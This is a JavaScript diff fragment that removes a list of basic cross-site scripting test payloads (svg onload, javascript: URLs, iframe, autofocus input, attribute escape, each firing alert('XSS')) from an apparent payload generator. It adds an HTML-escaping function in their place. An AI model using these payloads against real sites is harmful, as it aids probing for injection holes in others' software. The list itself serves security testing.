-      {
-        code: '<svg onload=alert("XSS")>',
-        category: 'moderate',
-        tags: ['svg', 'onload', 'bypass'],
-        browsers: ['Chrome', 'Firefox', 'Safari', 'Edge']
-      },
-      {
-        code: 'javascript:alert("XSS")',
-        category: 'basic',
-        tags: ['javascript', 'url'],
-        browsers: ['Chrome', 'Firefox', 'Safari', 'Edge']
-      },
-      {
-        code: '<iframe src=javascript:alert("XSS")>',
-        category: 'moderate',
-        tags: ['iframe', 'javascript'],
-        browsers: ['Chrome', 'Firefox', 'Edge']
-      },
-      {
-        code: '<body onload=alert("XSS")>',
-        category: 'basic',
-        tags: ['body', 'onload'],
-        browsers: ['Chrome', 'Firefox', 'Safari', 'Edge']
-      },
-      {
-        code: '<input onfocus=alert("XSS") autofocus>',
-        category: 'moderate',
-        tags: ['input', 'onfocus', 'autofocus'],
-        browsers: ['Chrome', 'Firefox', 'Safari', 'Edge']
-      },
-      {
-        code: '"><script>alert("XSS")</script>',
-        category: 'basic',
-        tags: ['attribute', 'escape'],
-        browsers: ['Chrome', 'Firefox', 'Safari', 'Edge']
-      }
-    ];
+  esc(str) {
+    return String(str)
+      .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+      .replace(/"/g,'&quot;').replace(/'/g,'&#x27;');
   }
 }
 
-// Initialize generator when DOM is ready
-document.addEventListener('DOMContentLoaded', () => {
-  window.generator = new XSSPayloadGenerator();
-});
+document.addEventListener('DOMContentLoaded', () => { window.gen = new Generator(); });
